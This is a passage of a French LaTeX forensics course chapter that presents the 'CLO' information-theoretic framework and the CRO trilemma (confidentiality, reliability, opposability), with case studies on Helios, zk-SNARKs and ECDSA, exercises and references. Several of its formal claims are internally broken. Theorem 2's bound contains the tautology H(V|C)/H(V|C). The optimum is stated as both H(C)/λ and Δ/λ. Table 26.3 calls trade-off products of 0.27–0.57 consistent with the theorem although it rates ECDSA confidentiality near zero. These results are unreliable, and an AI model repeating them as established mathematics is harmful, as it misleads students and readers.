idée intuitive~: \textbf{si l'on peut deviner $M$ avec une faible
erreur, alors $M$ ne peut pas être trop incertain compte tenu de
l'observation}. Appliquée au contexte forensique, elle force la
fiabilité ($\mathsf{Rel}$ élevé, faible erreur de vérification) à
impliquer une information mutuelle minimale entre message et
preuve~--- l'un des deux verrous de la démonstration du théorème
principal de ce chapitre.
\end{boxjuris}

% ============================================================================
\section{Le Cadre CLO~: Définitions Formelles}
\label{sec:cadre-clo}
% ============================================================================

\subsection{Le protocole CLO}

\begin{boxdef}
\textbf{Protocole CLO} (\textit{Cryptographic Legal Opposability})
\cite{minka2026clo}~: un protocole $\mathcal{P}$ consiste en~:
\begin{itemize}
    \item des espaces~: messages $\mathcal{M}$, preuves $\Sigma$,
          contextes $\mathcal{C}$, verdicts $\mathcal{V}$~;
    \item des algorithmes~: $\mathsf{Setup}$, $\mathsf{Prove}$,
          $\mathsf{Verify}$, et surtout
          $\mathsf{Interpret}(\sigma, c) \to v$~: \textbf{l'algorithme
          d'interprétation institutionnelle} qui transforme une
          preuve cryptographique $\sigma$, dans un contexte $c$,
          en un verdict exploitable $v$.
\end{itemize}
\end{boxdef}

L'apport conceptuel central de ce cadre est de formaliser
explicitement ce que la cryptographie classique ignore~:
$\mathsf{Verify}$ garantit la correction mathématique~;
$\mathsf{Interpret}$ formalise la capacité d'un acteur institutionnel
(juge, auditeur, régulateur~--- ou, dans ce cours, l'OPJ et le
magistrat camerounais) à \textbf{extraire un sens exploitable} de
cette preuve. C'est cette seconde exigence, absente des définitions
de sécurité cryptographique standard, que ce cours a systématiquement
appelée ``opposabilité''.

\subsection{Les trois mesures}

\begin{boxdef}
\textbf{Confidentialité}~\cite{minka2026clo}~:
\begin{equation}
\mathsf{Conf}(\mathcal{P}) = 1 - \max_{m_0,m_1 \in \mathcal{M}}
\mathrm{TV}\bigl(P_{\Sigma \mid M=m_0},\, P_{\Sigma \mid M=m_1}\bigr)
\label{eq:conf}
\end{equation}
$\mathsf{Conf} = 1$~: les preuves sont parfaitement indistinguables
quel que soit le message (confidentialité parfaite, au sens de la
théorie de l'information). $\mathsf{Conf} = 0$~: les preuves
révèlent complètement le message.

\textbf{Fiabilité}~\cite{minka2026clo}~:
\begin{equation}
\mathsf{Rel}(\mathcal{P}) = \min_{m \in \mathcal{M}, c \in \mathcal{C}}
\Pr[\mathsf{Verify}(pk, \mathsf{Prove}(sk,m,c), c) = 1]
\label{eq:rel}
\end{equation}
$\mathsf{Rel} = 1$~: les preuves honnêtes sont toujours vérifiées
correctement (complétude parfaite).

\textbf{Opposabilité}~\cite{minka2026clo}~:
\begin{equation}
\mathsf{Opp}(\mathcal{P}, C) = \frac{I(V; \Sigma \mid C)}{H(V \mid C)}
\label{eq:opp}
\end{equation}
$\mathsf{Opp}$ mesure la \textbf{fraction de l'incertitude sur le
verdict que l'observation de la preuve permet effectivement de
lever}, étant donné le contexte institutionnel. $\mathsf{Opp} = 1$~:
la preuve détermine entièrement le verdict (opposabilité parfaite).
$\mathsf{Opp} = 0$~: la preuve n'apporte aucune information
exploitable au-delà du contexte déjà disponible.
\end{boxdef}

\begin{boxalert}
\textbf{Sur la nature mesurable de $\mathsf{Opp}$~: une innovation
du cadre CLO}

Contrairement à la confidentialité et à la fiabilité, déjà
formalisées de longue date en cryptographie, l'opposabilité au sens
de la définition~\eqref{eq:opp} \textbf{est une mesure originale}
introduite dans~\cite{minka2026clo}. C'est elle qui permet de
quantifier rigoureusement une intuition que ce cours a mobilisée
de façon qualitative depuis le Prologue~: une preuve peut être
mathématiquement irréprochable ($\mathsf{Rel}$ élevé) tout en étant
\textbf{institutionnellement inexploitable} si aucun décideur ne
peut en extraire un verdict actionnable~--- exactement le
``\textit{Invisible Authenticity Paradox}'' documenté dans
l'article fondateur (Section~\ref{sec:etudes-cas}).
\end{boxalert}

% ============================================================================
\section{Les Théorèmes Fondamentaux}
\label{sec:theoremes}
% ============================================================================

\subsection{Bornes de mesure et goulot d'étranglement contextuel}

\begin{boxjuris}
\textbf{Théorème~1 (Bornes de mesure)}~\cite{minka2026clo}~: pour
tout protocole CLO $\mathcal{P}$~:
\begin{equation}
0 \leq \mathsf{Conf}(\mathcal{P}) \leq 1, \quad
0 \leq \mathsf{Rel}(\mathcal{P}) \leq 1, \quad
0 \leq \mathsf{Opp}(\mathcal{P}, \mu) \leq 1
\label{thm:bounds}
\end{equation}
\end{boxjuris}

\begin{boxjuris}
\textbf{Théorème~2 (Goulot d'étranglement contextuel)}~%
\cite{minka2026clo}~: pour tout protocole CLO avec fonction
d'interprétation $\mathsf{Interpret}$ et distribution de contexte
$\mu$ sur $\mathcal{C}$~:
\begin{equation}
\mathsf{Opp}(\mathcal{P}, C) \leq \min\left\{1,\;
\frac{H(V \mid C)}{H(V \mid C)}\right\}
= \min\left\{1, \frac{I(V;\Sigma\mid C)}{H(V\mid C)}\right\}
\label{thm:bottleneck}
\end{equation}
\textbf{Interprétation}~: l'opposabilité est structurellement
plafonnée par la \textbf{capacité de connaissance de
l'interprète}~--- c'est-à-dire par ce que le contexte institutionnel
($H(C)$~: la formation du juge, la richesse du cadre légal,
l'expertise de l'auditeur) permet effectivement de distinguer.
Aucune sophistication cryptographique supplémentaire ne peut
compenser un goulot d'étranglement de compréhension institutionnelle.
\end{boxjuris}

\begin{boiteRemarque}{Une lecture directement applicable au Cameroun}
Le Théorème~2 explique, en termes rigoureux, une observation
qualitative déjà rencontrée au Ch.~\ref{chap:droit-cam}~: la
formation des magistrats camerounais au droit du numérique
constitue un facteur limitant pour l'opposabilité des preuves
numériques, indépendamment de la qualité technique de l'expertise
forensique produite. Investir dans $H(C)$ (la formation des juges,
des OPJ, des avocats) augmente le plafond théorique d'opposabilité
atteignable par \emph{tout} système de preuve, là où investir
uniquement dans la sophistication cryptographique ($\Sigma$) ne le
fait pas.
\end{boiteRemarque}

\subsection{Le Théorème d'Impossibilité Général}

L'article fondateur~\cite{minka2026clo} avait établi le Corollaire~2
(la tension qualitative entre les trois dimensions) mais laissait
ouverte, explicitement, la question d'une \textbf{borne générale
quantifiée}. C'est cette question que résout
l'article~\cite{minka2026conditional}.

\begin{boxjuris}
\textbf{Théorème~3 (Trilemme CRO Conditionnel, pour protocoles
réguliers)}~\cite{minka2026conditional}~: sous des hypothèses de
capacité d'extraction bornée, d'espace de verdicts borné et de
régularité du protocole, pour tout protocole de preuve $\mathcal{P}$
avec paramètre de sécurité $\lambda \geq 64$~:
\begin{equation}
\mathsf{Conf}(\mathcal{P}) \cdot \mathsf{Rel}(\mathcal{P}) \cdot
\mathsf{Opp}(\mathcal{P}) \;\leq\; \frac{\Delta}{\lambda} +
O(\lambda^{-2}) + \mathrm{negl}(\lambda)
\label{thm:trilemma-general}
\end{equation}
où $\Delta$ quantifie la \textbf{capacité d'extraction
institutionnelle} (le nombre de bits d'information décisionnelle
qu'un interprète humain peut effectivement traiter), et le terme
$O(\lambda^{-2})$ capture les contraintes cryptographiques d'ordre
supérieur, négligeables pour les paramètres de sécurité usuels
($\lambda \geq 128$).
\end{boxjuris}

\subsection{Esquisse de la démonstration}

La preuve complète, technique, occupe plusieurs pages
de~\cite{minka2026conditional}~; cette section en donne la structure
logique, suffisante pour en comprendre la portée sans en reproduire
tous les détails calculatoires.

\begin{enumerate}
    \item \textbf{La fiabilité force l'information mutuelle.}
          Par l'inégalité de Fano~\eqref{eq:fano}, si
          $\mathsf{Rel} \geq 1/2$ (toute preuve raisonnable doit
          au moins faire mieux qu'une pièce de monnaie), alors
          $I(M; \Sigma, C) \geq \mathsf{Rel} \cdot \lambda - 1$~:
          un système fiable nécessite que la preuve porte une
          quantité substantielle d'information sur le message.
    \item \textbf{L'opposabilité est bornée par l'extraction
          institutionnelle.} Si l'on modélise la capacité
          d'extraction humaine $K$ comme limitée à $\Delta$~bits
          (justifié en Section~\ref{sec:capacite-extraction}),
          alors $I(V;\Sigma\mid C) \lesssim I(M;\Sigma\mid C) + \Delta$.
    \item \textbf{L'espace des verdicts est borné.} Par le théorème
          de codage de source de Shannon, un espace de verdicts
          institutionnellement gérable impose
          $H(V \mid C) \geq \alpha \cdot H(C) - 1$ pour un paramètre
          $\alpha$ de granularité des verdicts.
    \item \textbf{La confidentialité est bornée par Pinsker.} Une
          forte information mutuelle $I(M;\Sigma\mid C)$ (requise
          pour la fiabilité, étape~1) implique, via
          l'inégalité~\eqref{eq:pinsker}, une borne supérieure sur
          $\mathsf{Conf}$~: plus la preuve est informative sur le
          message, moins elle peut rester confidentielle.
    \item \textbf{Combinaison et optimisation.} En combinant ces
          quatre bornes et en optimisant sur la variable
          $x = I(M;\Sigma\mid C)$ (un compromis interne entre
          fiabilité et confidentialité), on obtient le maximum
          atteignable du produit
          $\mathsf{Conf} \cdot \mathsf{Rel} \cdot \mathsf{Opp}$,
          qui se révèle être exactement~$\Delta/\lambda$ à des
          termes négligeables près.
\end{enumerate}

\begin{boxalert}
\textbf{Honnêteté scientifique sur la portée du résultat}

Comme tout résultat de recherche rigoureux, ce théorème s'applique
sous des \textbf{hypothèses explicites} (protocoles ``réguliers'',
capacité d'extraction additive et non multiplicative, espace de
verdicts borné)~--- discutées et justifiées
dans~\cite{minka2026conditional}, mais qui délimitent le domaine
de validité du résultat. Les auteurs eux-mêmes identifient des
formes alternatives de bornes (sous-linéaire, saturante) comme
pistes de recherche future. Cette transparence sur les limites
d'un résultat est elle-même une compétence forensique~:
documenter ce qu'une analyse établit \emph{et} ce qu'elle
n'établit pas (Ch.~\ref{chap:rapport}, distinction
constatation/analyse).
\end{boxalert}

% ============================================================================
\section{Capacité d'Extraction Institutionnelle~: le Paramètre $\Delta$}
\label{sec:capacite-extraction}
% ============================================================================

\subsection{Fondement en sciences cognitives}

Le paramètre $\Delta$ n'est pas un artifice mathématique sans
ancrage empirique~: il est directement relié aux travaux fondateurs
de Miller~\cite{miller1956} sur la capacité de la mémoire de travail
humaine, estimée à $7 \pm 2$ ``chunks'' d'information.

\begin{tableaucours}{p{3.5cm}p{3.0cm}p{4.5cm}}{%
    \tableauHeader{Composante} &
    \tableauHeader{Estimation} &
    \tableauHeader{Justification}
}
Capacité individuelle de base & $\approx 21$~bits &
    7~chunks~$\times$~3~bits par chunk (distinction entre~8~états
    possibles par chunk) \\
+ Documentation institutionnelle & $+5$ à $10$~bits &
    Procédures écrites, matériaux de référence
    (ex.~: guides de qualification, Ch.~\ref{chap:droit-cam}) \\
+ Collaboration & $+10$ à $20$~bits &
    Délibération multi-acteurs, mise en commun d'expertise
    (collège de juges, équipe d'enquête) \\
+ Spécialisation & $+10$ à $15$~bits &
    Formation spécifique au-delà de la cognition générale
    (expert agréé, Ch.~\ref{chap:droit-cam}) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~26.1 --- Construction du paramètre
$\Delta$ pour une institution bien dotée}\end{center}

Cette construction additive conduit à une estimation
$\Delta \in [20, 60]$~bits pour des institutions bien dotées en
ressources, cohérente avec les analyses empiriques de contextes
réels présentées dans les deux articles.

\subsection{Estimations empiriques de $H(C)$ par contexte}

\begin{tableaucours}{p{3.5cm}p{2.5cm}p{5.0cm}}{%
    \tableauHeader{Contexte institutionnel} &
    \tableauHeader{$H(C)$ estimé} &
    \tableauHeader{Justification}
}
Tribunal de juridiction générale & $\approx 8$~bits &
    $\approx 256$~contextes évidentiaires distingués \\
Régulateur spécialisé & $\approx 11$~bits &
    $\approx 2048$~contextes (réglementation financière détaillée) \\
Expert technique de domaine & $\approx 20$~bits &
    $\approx 10^6$~contextes (connaissance fine du domaine) \\
Contexte électoral (Helios) & $30$ à $50$~bits &
    Registre des électeurs, structure du scrutin, règles du
    district \\
Conformité financière (zk-SNARKs) & $40$ à $70$~bits &
    Historique des transactions, réglementation, pistes d'audit \\
Signature contractuelle (ECDSA) & $20$ à $40$~bits &
    Parties, termes, juridiction~--- contexte volontairement
    restreint \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~26.2 --- Estimations empiriques de
$H(C)$ par type de contexte (d'après~\cite{minka2026clo,minka2026conditional})}\end{center}

\begin{boiteRemarque}{Le paradoxe de l'écart de capacité}
Une observation frappante des deux articles~: atteindre une
opposabilité significative ($\mathsf{Opp} \gtrsim 0{,}5$) pour des
paramètres de sécurité cryptographique usuels ($\lambda = 128$
à~$256$~bits) exigerait un contexte institutionnel
$H(C) \approx 64$ à~$128$~bits. Or les estimations empiriques de
contextes institutionnels réels (Tableau~26.2) plafonnent typiquement
à~$8$ à~$20$~bits~--- un \textbf{écart d'un facteur~5 à~10} entre
ce que la cryptographie moderne exige et ce que les institutions
peuvent effectivement traiter. C'est ce paradoxe que les auteurs
nomment l'\textit{Invisible Authenticity Paradox}.
\end{boiteRemarque}

% ============================================================================
\section{Trois Études de Cas Documentées}
\label{sec:etudes-cas}
% ============================================================================

L'article fondateur~\cite{minka2026clo} analyse trois systèmes
cryptographiques réellement déployés, révélant des positions
distinctes et cohérentes sur la surface de compromis CRO.

\subsection{Helios~: vérifiabilité électorale}

Le protocole de vote électronique Helios~\cite{adida2009helios}
combine chiffrement ElGamal et preuves à divulgation nulle pour
garantir l'intégrité du scrutin sans compromettre le secret du vote.

\begin{boxscenario}{Helios --- l'institutionnalisation impossible}
Lors de l'élection présidentielle de l'\textit{Université catholique
de Louvain} (mars~2009)~\cite{adida2009university}, les
``\textit{trustees}'' (fiduciaires) sélectionnés parmi des étudiants
et le personnel administratif~--- choisis pour leur représentativité
institutionnelle, pas pour leur expertise cryptographique~---
n'ont pas pu exécuter eux-mêmes les opérations de génération et de
déchiffrement des clés. Des experts cryptographiques externes ont
dû intervenir. Plus frappant encore~: l'\textit{International
Association for Cryptologic Research} (IACR), pourtant composée
de cryptographes professionnels, a dû \textbf{annuler entièrement}
son élection de novembre~2025 après qu'un fiduciaire a
irrémédiablement perdu sa portion de la clé de déchiffrement
distribuée~\cite{iacr2025}.
\end{boxscenario}

\textbf{Lecture CRO}~: Helios atteint une confidentialité et une
fiabilité élevées (le secret du vote et l'intégrité du dépouillement
sont mathématiquement garantis), mais une opposabilité
institutionnelle estimée à $\mathsf{Opp} \approx 0{,}50$~--- même
des cryptographes professionnels peinent à opérer le système de
façon autonome.

\subsection{zk-SNARKs~: conformité financière}

Les preuves à divulgation nulle succinctes (zk-SNARKs) permettent
à une institution financière de prouver sa conformité réglementaire
(lutte anti-blanchiment, filtrage des sanctions) via une preuve
de quelques centaines d'octets, sans révéler le détail des
transactions sous-jacentes.

\textbf{Lecture CRO}~: confidentialité quasi-parfaite des
transactions individuelles, mais lorsqu'un schéma suspect émerge
et qu'une investigation ciblée devient nécessaire (exactement le
type de situation rencontré au Ch.~\ref{chap:for-cloud} de ce
cours, analyse blockchain), l'opacité cryptographique qui protège
la confidentialité des clients \textbf{empêche précisément
l'investigation que la réglementation est censée permettre}.
L'article estime $\mathsf{Opp} \approx 0{,}67$ pour ce type de
système~--- meilleur qu'Helios, mais encore loin de l'optimum.

\subsection{ECDSA~: preuve juridique}

À l'opposé du spectre, les signatures numériques à courbes
elliptiques (ECDSA)~\cite{johnson2001ecdsa}, omniprésentes dans
les infrastructures à clé publique (Ch.~\ref{chap:leg-mond},
eIDAS), atteignent une \textbf{acceptation judiciaire quasi
universelle}~: les tribunaux comprennent l'affirmation sémantique
``la partie A a autorisé le document D'' sans formation
cryptographique, via des décennies de jurisprudence et
d'infrastructure PKI établie.

\textbf{Lecture CRO}~: $\mathsf{Opp} \approx 0{,}90$~--- la plus
élevée des trois systèmes étudiés~--- mais au prix d'une
confidentialité quasi nulle~: la vérification exige de révéler
publiquement les messages signés et les relations entre clés,
incompatible avec des contextes exigeant confidentialité
(contrats sensibles, documents judiciaires scellés).

\subsection{Synthèse}

\begin{tableaucours}{p{3.0cm}p{2.2cm}p{2.2cm}p{2.2cm}p{2.8cm}}{%
    \tableauHeader{Système} &
    \tableauHeader{$\mathsf{Conf}$} &
    \tableauHeader{$\mathsf{Rel}$} &
    \tableauHeader{$\mathsf{Opp}$} &
    \tableauHeader{Tension dominante}
}
Helios (vote) & Élevé & Élevé & $\approx 0{,}50$ &
    Confidentialité/Fiabilité $\to$ Opposabilité \\
zk-SNARK (finance) & Quasi-parfait & Élevé & $\approx 0{,}67$ &
    Confidentialité $\to$ Opposabilité (audit ciblé impossible) \\
ECDSA (juridique) & Quasi-nul & Élevé & $\approx 0{,}90$ &
    Opposabilité $\to$ Confidentialité \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~26.3 --- Synthèse des trois études
de cas (d'après~\cite{minka2026clo})~: les produits
$\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp}$ observés s'échelonnent
de~$0{,}27$ à~$0{,}57$ selon le système, cohérent avec la borne du
Théorème~3}\end{center}

% ============================================================================
\section{Implications pour la Conception de Systèmes Forensiques}
\label{sec:implications-conception}
% ============================================================================

\subsection{Du calcul optimal à l'ingénierie sous contrainte}

L'implication méthodologique majeure des deux
articles~\cite{minka2026clo,minka2026conditional} est un
\textbf{changement de paradigme de conception}~: puisqu'aucun
protocole ne peut maximiser simultanément les trois dimensions
(Théorème~3), la question pertinente n'est plus ``quelle est la
primitive optimale~?'' mais ``\textbf{quel arbitrage spécifique
ce contexte institutionnel exige-t-il, et quelle architecture
satisfait ce besoin~?}''

\begin{boxCRO}
\textbf{Analyse CRO --- L'architecture Gold-Iron-Clay
(\textit{Semantic One-Time Pad})}

L'article fondateur~\cite{minka2026clo} propose et prouve
optimale, au sein de sa classe de construction, une architecture
en trois couches~: \textbf{Gold} (confidentialité parfaite via
masque jetable), \textbf{Iron} (fiabilité via engagement
cryptographique liant), \textbf{Clay} (préservation contextuelle
pour l'opposabilité). Cette construction atteint
$\mathsf{Conf} \cdot \mathsf{Rel} \cdot \mathsf{Opp} =
H(C)/\lambda \cdot (1 - \mathrm{negl}(\lambda))$~--- l'optimum
exact permis par la borne du Théorème~2, démontrant qu'une
architecture multicouche peut effectivement \textbf{atteindre}
(et non simplement approcher) la limite théorique.

$\mathcal{R}$~: chaque couche apporte sa force dominante plutôt
que de chercher une primitive unique universelle~--- exactement
la logique de la chaîne de custody du Ch.~\ref{chap:custody}
(hash pour l'intégrité, signature pour l'authenticité, formulaire
papier pour la traçabilité).

$\mathcal{O}$~: la preuve d'optimalité, publiée et vérifiable,
confère à cette architecture une légitimité scientifique directement
opposable dans une discussion technique.

\cro{$\uparrow\uparrow$ couche Gold}{$\uparrow\uparrow$ couche Iron}{$\uparrow\uparrow$ couche Clay}
\end{boxCRO}

\subsection{Application à l'architecture forensique de ce cours}

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Dimension prioritaire} &
    \tableauHeader{Mécanisme apportant cette force} &
    \tableauHeader{Exemple dans ce cours}
}
$\mathsf{Rel}$ (Fiabilité) & Hash cryptographique
    (SHA-256/512) & Formulaire de custody
    (Ch.~\ref{chap:custody})~: hash calculé avant et après
    acquisition \\
$\mathsf{Opp}$ (Opposabilité) & Signature qualifiée +
    horodatage + formation du décideur & eIDAS
    (Ch.~\ref{chap:leg-mond})~; investissement dans $H(C)$ via la
    formation des magistrats (Ch.~\ref{chap:droit-cam}) \\
$\mathsf{Conf}$ (Confidentialité) & Chiffrement +
    minimisation de la collecte & Extraction ADB ciblée plutôt
    qu'exhaustive (Ch.~\ref{chap:for-mob})~; proportionnalité
    (\loicam{2024/017}, art.~27) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~26.4 --- Architecture en couches
appliquée au cadre forensique de ce cours}\end{center}

Cette table révèle une cohérence remarquable~: la pratique
forensique enseignée tout au long de ce cours~--- chaîne de custody,
distinction constatation/analyse, principe de proportionnalité~---
\textbf{constitue, sans que cela ait été formulé explicitement avant
ce chapitre, une instanciation pratique de l'architecture en couches
prouvée optimale par le cadre CLO}.

% ============================================================================
\section{Application Forensique Intégrative}
\label{sec:application-forensique}
% ============================================================================

\begin{boxscenario}{Relire l'affaire MVOM à travers le Trilemme CRO formalisé}
Reprenons l'Opération MVOM (Ch.~\ref{chap:for-sys},
\ref{chap:for-res}, \ref{chap:for-cloud}) à la lumière de ce
chapitre.

\textbf{Le hash \texttt{\$UsnJrnl}} (Ch.~\ref{chap:for-sys})~:
$\mathsf{Rel}$ proche de~1 (déterministe, vérifiable
indépendamment)~; $\mathsf{Conf}$ non pertinent (le hash ne protège
aucune confidentialité)~; $\mathsf{Opp}$ élevé \emph{si et seulement
si} le tribunal dispose de la formation technique pour interpréter
un horodatage de journal système~--- exactement la dépendance au
contexte $H(C)$ formalisée par le Théorème~2.

\textbf{Le chiffrement BitLocker du disque saisi}
(Ch.~\ref{chap:PIU})~: $\mathsf{Conf}$ élevé pour le suspect avant
saisie~; après saisie légale et obtention de la clé, le système
bascule vers un régime où $\mathsf{Rel}$ et $\mathsf{Opp}$
deviennent les dimensions pertinentes pour l'analyse forensique~---
illustrant que le positionnement CRO d'un mécanisme \textbf{dépend
du moment et du détenteur} de l'information, pas uniquement de
l'algorithme.

\textbf{La transaction Bitcoin tracée} (Ch.~\ref{chap:for-cloud})~:
$\mathsf{Conf}$ faible (registre public)~; $\mathsf{Rel}$ maximal
(immuabilité de la blockchain)~; $\mathsf{Opp}$ initialement faible
(pseudonymat) mais \textbf{augmentable} par l'apport de contexte
externe (identification KYC aux points d'échange)~--- une
illustration directe du Théorème~2~: l'opposabilité croît avec
$H(C)$, ici obtenu par corrélation avec des sources tierces plutôt
que par la primitive cryptographique elle-même.
\end{boxscenario}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item Le \textbf{Trilemme CRO} est désormais un résultat
          \textbf{publié et évalué par les pairs}
          (IEEE Access,~2026, IF~$\approx 3{,}6$)~: les
          Théorèmes~1, 2 et~3 de ce chapitre correspondent à des
          théorèmes prouvés dans~\cite{minka2026clo}
          et~\cite{minka2026conditional}, pas à des conjectures.

    \item \textbf{Outils de théorie de l'information mobilisés}~:
          entropie de Shannon, information mutuelle, distance en
          variation totale, inégalités de Pinsker et de Fano
          --- fondements classiques appliqués à un problème nouveau.

    \item \textbf{Définitions formelles}~: $\mathsf{Conf}$ (via TV
          distance), $\mathsf{Rel}$ (probabilité de vérification
          correcte), $\mathsf{Opp}$ (information mutuelle normalisée
          entre preuve et verdict)~--- cette dernière étant
          l'innovation centrale du cadre.

    \item \textbf{Théorème principal}~: $\mathsf{Conf} \cdot
          \mathsf{Rel} \cdot \mathsf{Opp} \leq \Delta/\lambda +
          O(\lambda^{-2})$, où $\Delta$ quantifie la capacité
          d'extraction institutionnelle, enracinée dans les travaux
          de Miller sur la mémoire de travail humaine.

    \item \textbf{Trois études de cas documentées}~: Helios
          ($\mathsf{Opp}\approx 0{,}50$), zk-SNARKs
          ($\approx 0{,}67$), ECDSA ($\approx 0{,}90$)~---
          chacune occupant un point distinct, cohérent avec la
          théorie, sur la surface de compromis.

    \item \textbf{Réponse pratique~: architecture en couches}
          (Gold-Iron-Clay), prouvée optimale dans sa classe de
          construction, dont ce cours a montré qu'elle correspond
          structurellement à la pratique forensique enseignée
          depuis le Ch.~\ref{chap:custody}.

    \item \textbf{Investir dans $H(C)$}~--- la formation des
          magistrats et des OPJ camerounais~--- élève le plafond
          d'opposabilité atteignable par \emph{tout} système de
          preuve, une implication directement actionnable pour
          la stratégie nationale évoquée au Ch.~\ref{chap:bench}.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~26.1 --- Maîtrise des outils de théorie de l'information \niveaubase}]
\begin{enumerate}[(a)]
    \item Calculez $H(X)$ pour une variable $X$ uniforme sur
          $4$~valeurs. Interprétez le résultat en bits.
    \item Si $I(X;Y) = H(X)$, que peut-on en conclure sur la
          relation entre $X$ et $Y$~?
    \item Expliquez, en une phrase, pourquoi l'inégalité de
          Pinsker~\eqref{eq:pinsker} permet de relier une exigence
          de fiabilité à une borne sur la confidentialité.
    \item Pour chacun des trois mécanismes suivants rencontrés
          dans ce cours, identifiez la dimension CRO structurellement
          privilégiée et celle structurellement sacrifiée, en
          justifiant par un argument technique~: le chiffrement
          BitLocker (Ch.~\ref{chap:PIU})~; une signature ECDSA
          (Ch.~\ref{chap:leg-mond})~; une preuve à divulgation
          nulle de connaissance.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~26.2 --- Lecture critique du Théorème~3 \niveaumoyen}]
\begin{enumerate}[(a)]
    \item Le Théorème~3 s'applique sous l'hypothèse
          $\lambda \geq 64$. Pourquoi cette condition est-elle
          nécessaire (référez-vous au rôle du terme
          $O(\lambda^{-2})$)~?
    \item Le Tableau~26.2 estime $H(C) \approx 8$~bits pour un
          tribunal de juridiction générale. En utilisant le
          Théorème~2, et pour $\lambda = 128$, estimez l'opposabilité
          maximale théoriquement atteignable dans ce contexte si
          $H(V|C) \approx H(C)$. Commentez l'écart avec
          l'opposabilité ECDSA observée empiriquement
          ($\approx 0{,}90$)~--- que cela révèle-t-il sur les
          conditions d'application du théorème~?
    \item Le chapitre mentionne que la forme additive de $\Delta$
          (plutôt que multiplicative ou sous-linéaire) a été
          choisie et justifiée par les auteurs. Pourquoi une
          borne sous-linéaire serait-elle ``trop pessimiste'',
          selon les termes de l'article~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~26.3 --- Application intégrative à une affaire du cours \niveauexpert}]
Reprenez l'affaire DIBAMBA (Ch.~\ref{chap:cas-int})~: fraude MoMo
avec SIM~swap, communications chiffrées, et adresse Bitcoin tracée.
\begin{enumerate}[(a)]
    \item Pour chacun des trois éléments probatoires de cette
          affaire (logs MTN, communications chiffrées, transactions
          blockchain), estimez qualitativement (Faible/Modéré/Élevé,
          en justifiant) les trois mesures $\mathsf{Conf}$,
          $\mathsf{Rel}$, $\mathsf{Opp}$, en vous appuyant sur les
          définitions formelles de la Section~\ref{sec:cadre-clo}.
    \item En vous inspirant de l'architecture Gold-Iron-Clay
          (Section~\ref{sec:implications-conception}), construisez
          une architecture en couches pour cette affaire~: quel
          mécanisme apporte la force $\mathsf{Rel}$~? Lequel apporte
          $\mathsf{Opp}$~? Lequel gère $\mathsf{Conf}$~?
    \item Le Théorème~2 implique que l'opposabilité de cette
          affaire est plafonnée par $H(C)$ du tribunal saisi.
          Proposez deux actions concrètes, dans l'esprit du
          Tableau~26.1 (documentation, collaboration, spécialisation),
          qui augmenteraient $H(C)$ pour ce dossier spécifique.
    \item Rédigez un paragraphe de synthèse expliquant en quoi
          cet exercice illustre que le Trilemme CRO formalisé
          dans ce chapitre n'est pas une abstraction mathématique
          déconnectée, mais la \textbf{systématisation rigoureuse},
          désormais publiée et vérifiable, d'un raisonnement que
          vous avez pratiqué tout au long de ce cours.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Sur la place de ce chapitre dans le cours.} Ce chapitre
referme la boucle conceptuelle ouverte au tout premier chapitre
du cours~: le Trilemme CRO, présenté ici dans sa forme prouvée et
publiée, est l'outil que vous avez appliqué intuitivement à chaque
décision investigative rencontrée~--- du choix d'éteindre ou non
un PC suspect (Ch.~\ref{chap:custody}) à la stratégie de coopération
internationale (Ch.~\ref{chap:norm-glob}), en passant par la
conception d'une architecture de \textit{readiness} cloud-native
(Ch.~\ref{chap:containers}).

\textit{Que vous reteniez une seule chose de ce chapitre, que ce
soit celle-ci~: tout système, toute décision, toute primitive
implique un arbitrage entre confidentialité, fiabilité et
opposabilité~--- et ce n'est plus une intuition pédagogique mais
un théorème mathématique prouvé, publié et évalué par les pairs.
La compétence de l'investigateur ne consiste pas à éliminer cet
arbitrage~--- c'est désormais mathématiquement établi comme
structurellement impossible. Elle consiste à le rendre
\textbf{explicite, justifié et documenté}, et, quand l'institution
le permet, à investir dans $H(C)$ pour repousser la limite elle-même.}
\end{boxinfo}

% ============================================================================
% Références bibliographiques propres à ce chapitre
% (à intégrer dans D_bibliographie.tex)
% ============================================================================
% @article{minka2026clo,
%   author  = {Minka Mi Nguidjoï, Thierry Emmanuel and Mani Onana,
%              Flavien Serge and Djotio Ndjé, Thomas},
%   title   = {Cryptographic Legal Opposability (CLO) Framework:
%              Confidentiality-Reliability-Opposability Trade-Offs
%              in Institutional Cryptography},
%   journal = {IEEE Access},
%   volume  = {14},
%   pages   = {20427--20445},
%   year    = {2026},
%   doi     = {10.1109/ACCESS.2026.3660105}
% }
% @article{minka2026conditional,
%   author  = {Minka Mi Nguidjoï, Thierry Emmanuel and Mani Onana,
%              Flavien Serge and Djotio Ndjé, Thomas},
%   title   = {The Conditional CRO Trilemma: Impossibility Bounds
%              on Confidentiality, Reliability, and Opposability
%              Under Institutional Extraction Limits},
%   journal = {IEEE Access},
%   volume  = {14},
%   pages   = {33263--33274},
%   year    = {2026},
%   doi     = {10.1109/ACCESS.2026.3669065}
% }
% @article{shannon1948,
%   author  = {Shannon, Claude E.},
%   title   = {A Mathematical Theory of Communication},
%   journal = {Bell System Technical Journal},
%   volume  = {27}, number = {3}, pages = {379--423}, year = {1948}
% }
% @article{miller1956,
%   author  = {Miller, George A.},
%   title   = {The Magical Number Seven, Plus or Minus Two},
%   journal = {Psychological Review}, volume = {63}, pages = {81--97},
%   year    = {1956}
% }
% @inproceedings{adida2009helios,
%   author = {Adida, Ben}, title = {Helios: Web-based open-audit voting},
%   booktitle = {Proc. 17th USENIX Security Symp.}, pages = {335--348},
%   year = {2009}
% }
% @inproceedings{adida2009university,
%   author = {Adida, Ben and de Marneffe, Olivier and Pereira, Olivier
%             and Quisquater, Jean-Jacques},
%   title  = {Electing a university president using open-audit voting:
%             Analysis of real-world use of Helios},
